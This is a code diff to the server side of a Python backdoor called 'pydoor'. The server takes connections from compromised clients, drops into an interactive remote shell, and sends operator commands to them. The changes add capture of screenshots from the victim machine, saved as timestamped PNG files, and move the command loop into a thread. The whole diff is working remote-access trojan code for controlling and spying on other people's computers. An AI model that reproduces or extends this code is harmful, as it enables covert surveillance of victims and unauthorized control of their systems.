@@ -1,10 +1,15 @@
 #!/usr/bin/env python
 
 import socket
+from PIL import Image
 import time
 import sys
 import argparse
-
+import base64
+import pyautogui
+import os
+import datetime
+import threading
 
 BUFFER = 4096
 
@@ -44,11 +49,24 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
 
 
     def handle_response(self, resp):
+
+        encodedresp = resp
+        resp = resp.decode('utf-8', 'ignore')
         if "pydoor.quit" in resp:
             print("Quit signal received from client " + self.host)
-            sys.exit(0) 
+            os._exit(0) 
         elif "pydoor_null" in resp:
             return
+        elif self.cmd == "screenshot":
+            #resp = encodedresp.replace(b"Screenshot ", b"")
+            #resp = resp.replace('.', '=')
+            #screenshot_bytes = base64.b64decode(resp)
+            screenshot_bytes = encodedresp
+            file_name = str(datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")) +".png"
+            #os.mknod(file_name)
+
+            with open(file_name, 'wb+') as f:
+                f.write(screenshot_bytes)
         else:
             print(resp)
 
@@ -76,9 +94,26 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
                 return 0
             else:
                 return 1
+
+
         
         else:
             return 0
+
+    def shinput(self):
+        while True:
+            self.cmd = input(">")
+            if self.cmd == "":
+                continue
+            if (self.preprocesscmd() == 0):
+
+                self.con.sendall(self.cmd.encode())
+                dat = self.recvall()
+                self.handle_response(dat)
+            else:
+                pass
+
+
 
 
 
@@ -109,18 +144,9 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
                 self.host = str(self.sock.getsockname()).strip("(").strip(")").strip(",").replace("'", "") #Remove tuple stuff like parentheses before printing, we dont need any anyways
                 
                 print(f"Connection received from client, {self.host} dropping shell")
-                while True:
-                    self.cmd = input(">")
-                    if self.cmd == "":
-                        continue
-                    if (self.preprocesscmd() == 0):
-
-                        self.con.sendall(self.cmd.encode())
-                        dat = self.recvall().decode()
-                        self.handle_response(dat.rstrip())
-                    else:
-                        pass
-
+                inp = threading.Thread(target=self.shinput)
+                inp.start()
+                inp.join()
                 
 if __name__ == "__main__":
     s = Server()
